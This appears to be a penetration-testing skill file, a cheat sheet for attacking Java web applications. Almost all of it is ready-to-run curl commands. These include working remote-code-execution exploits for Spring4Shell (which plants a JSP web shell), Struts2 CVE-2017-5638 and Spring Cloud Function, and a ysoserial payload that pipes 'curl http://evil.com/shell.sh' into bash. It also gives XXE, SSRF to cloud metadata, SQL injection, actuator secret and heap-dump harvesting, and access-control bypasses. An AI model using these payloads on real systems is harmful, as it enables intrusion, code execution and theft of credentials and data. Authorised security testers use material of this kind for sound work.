---
name: java
description: Java web application security testing - Spring Boot, Struts, JSF, and common Java vulnerabilities
---

# Java Web Application Security

## Fingerprinting

### Identify Java Frameworks
```bash
# Check headers
curl -I https://target.com | grep -iE "(x-powered-by|server)" | grep -i "java\|jsp\|servlet\|spring\|struts"

# Check for common Java paths
curl -s https://target.com/WEB-INF/web.xml
curl -s https://target.com/META-INF/MANIFEST.MF
curl -s https://target.com/actuator
curl -s https://target.com/struts/

# Check for JSP files
curl -s https://target.com/index.jsp
curl -s https://target.com/error.jsp
```

### Spring Boot Detection
```bash
# Check for Spring Boot actuator
curl -s https://target.com/actuator
curl -s https://target.com/actuator/health
curl -s https://target.com/actuator/info
curl -s https://target.com/actuator/env

# Check for Spring Boot error page
curl -s https://target.com/error | grep -i "whitelabel\|spring"
```

## Common Vulnerabilities

### 1. Spring Boot Actuator Exposure

**Sensitive endpoints**
```bash
# List all actuator endpoints
curl -s https://target.com/actuator | jq '.links[].href'

# Environment variables (may contain secrets)
curl -s https://target.com/actuator/env | jq '.propertySources[].properties'

# Heap dump (may contain sensitive data)
curl -s https://target.com/actuator/heapdump -o heapdump.hprof

# Thread dump
curl -s https://target.com/actuator/threaddump

# Configuration properties
curl -s https://target.com/actuator/configprops

# Mappings (all endpoints)
curl -s https://target.com/actuator/mappings | jq '.contexts.application.mappings.dispatcherServlets'
```

**RCE via Spring Cloud Function (CVE-2022-22963)**
```bash
curl -X POST https://target.com/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \
  -d "test"
```

**RCE via Spring4Shell (CVE-2022-22965)**
```bash
curl -X POST https://target.com/greeting \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```

### 2. Apache Struts Vulnerabilities

**Struts2 RCE (CVE-2017-5638)**
```bash
curl -X POST https://target.com/struts2-showcase/index.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl@ognlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

**Struts2 OGNL Injection**
```bash
# Test for OGNL injection
curl "https://target.com/struts2-showcase/index.action?class['classLoader']['resources']['context']['parent']['pipeline']['first']['directory']=webapps/ROOT"
```

### 3. Java Deserialization

**Common vulnerable endpoints**
```bash
# RMI
nmap -sV --script=rmi-vuln-classloader -p 1099 target.com

# JMX
nmap -sV --script=rmi-dumpregistry -p 1099 target.com

# HTTP endpoints accepting serialized objects
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

**Generate payloads with ysoserial**
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate payload
java -jar ysoserial-all.jar CommonsCollections1 "curl http://evil.com/shell.sh | bash" > payload.ser

# Send payload
curl -X POST https://target.com/api/deserialize \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

### 4. SQL Injection (Java-specific)

**Oracle database**
```bash
# Union-based
curl "https://target.com/user.jsp?id=1' UNION SELECT NULL,banner,NULL FROM v$version--"

# Error-based
curl "https://target.com/user.jsp?id=1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--"

# Time-based
curl "https://target.com/user.jsp?id=1' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10) ELSE 1 END FROM dual)--"
```

**PostgreSQL**
```bash
# Union-based
curl "https://target.com/user.jsp?id=1' UNION SELECT NULL,version(),NULL--"

# Error-based
curl "https://target.com/user.jsp?id=1' AND 1=CAST((SELECT version()) AS INT)--"

# Time-based
curl "https://target.com/user.jsp?id=1' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE 1 END)--"
```

### 5. XXE in Java Applications

**Common XXE payloads**
```bash
# Basic XXE
curl -X POST https://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'

# Blind XXE with OOB
curl -X POST https://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><data>test</data>'

# XXE via XInclude
curl -X POST https://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></data>'
```

### 6. Server-Side Request Forgery (SSRF)

**Java-specific SSRF vectors**
```bash
# URL class
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# URLConnection
curl "https://target.com/fetch?url=file:///etc/passwd"

# Apache HttpClient
curl "https://target.com/fetch?url=gopher://127.0.0.1:25/_MAIL%20FROM"

# Bypass techniques
curl "https://target.com/fetch?url=http://127.0.0.1:80"
curl "https://target.com/fetch?url=http://localhost:80"
curl "https://target.com/fetch?url=http://[::]:80"
curl "https://target.com/fetch?url=http://0.0.0.0:80"
```

## Spring Boot Specific

### 1. H2 Database Console
```bash
# Check for H2 console
curl -s https://target.com/h2-console/

# Default credentials
# JDBC URL: jdbc:h2:mem:testdb
# Username: sa
# Password: (empty)
```

### 2. Swagger/OpenAPI Exposure
```bash
# Check for Swagger UI
curl -s https://target.com/swagger-ui.html
curl -s https://target.com/swagger-ui/index.html
curl -s https://target.com/v2/api-docs
curl -s https://target.com/v3/api-docs
```

### 3. Spring Security Bypass
```bash
# Path traversal bypass
curl "https://target.com/admin/..;/api/users"
curl "https://target.com/admin/%2e%2e;/api/users"

# Case sensitivity bypass
curl "https://target.com/ADMIN/api/users"
curl "https://target.com/Admin/Api/Users"
```

## Testing Checklist

- [ ] Identify Java framework (Spring Boot, Struts, JSF, etc.)
- [ ] Check for exposed Spring Boot actuator endpoints
- [ ] Test for Spring4Shell and Spring Cloud Function RCE
- [ ] Test for Struts2 OGNL injection
- [ ] Test for Java deserialization vulnerabilities
- [ ] Test for SQL injection (Oracle, PostgreSQL, MySQL)
- [ ] Test for XXE vulnerabilities
- [ ] Test for SSRF vulnerabilities
- [ ] Check for H2 database console
- [ ] Check for Swagger/OpenAPI exposure
- [ ] Test Spring Security bypass techniques

## Tools

```bash
# ysoserial for deserialization
java -jar ysoserial-all.jar

# SQLMap for Java databases
sqlmap -u "https://target.com/user.jsp?id=1" --dbms=oracle
sqlmap -u "https://target.com/user.jsp?id=1" --dbms=postgresql

# Nuclei templates for Java
nuclei -u https://target.com -t ~/nuclei-templates/technologies/java/
nuclei -u https://target.com -t ~/nuclei-templates/cves/2022/CVE-2022-22965.yaml
nuclei -u https://target.com -t ~/nuclei-templates/cves/2017/CVE-2017-5638.yaml
```
